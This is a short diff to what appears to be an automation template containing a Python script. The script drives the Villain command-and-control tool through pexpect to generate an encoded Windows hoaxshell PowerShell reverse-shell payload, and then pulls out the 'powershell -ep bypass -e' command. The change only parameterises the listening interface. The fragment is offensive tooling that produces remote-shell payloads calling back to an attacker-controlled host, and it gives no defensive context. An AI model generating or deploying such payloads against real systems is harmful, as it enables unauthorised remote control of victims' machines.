@@ -5,10 +5,12 @@
     content: |
       import pexpect
       import re
+      interface= {{ interface }}
       villain_prompt = '\x1b[4mVillain\x1b[0m > '
+      generate_command=f"generate payload=windows/hoaxshell/powershell_iex lhost={interface} encode"
       child = pexpect.spawn('villain -q', encoding='utf-8', timeout=20)
       child.expect(re.escape(villain_prompt))
-      child.sendline('generate payload=windows/hoaxshell/powershell_iex lhost=eth0 encode')
+      child.sendline(generate_command)
       child.expect(re.escape(villain_prompt))
       payload = child.before
       pattern = r"powershell -ep bypass -e ([A-Za-z0-9+/=]+)"
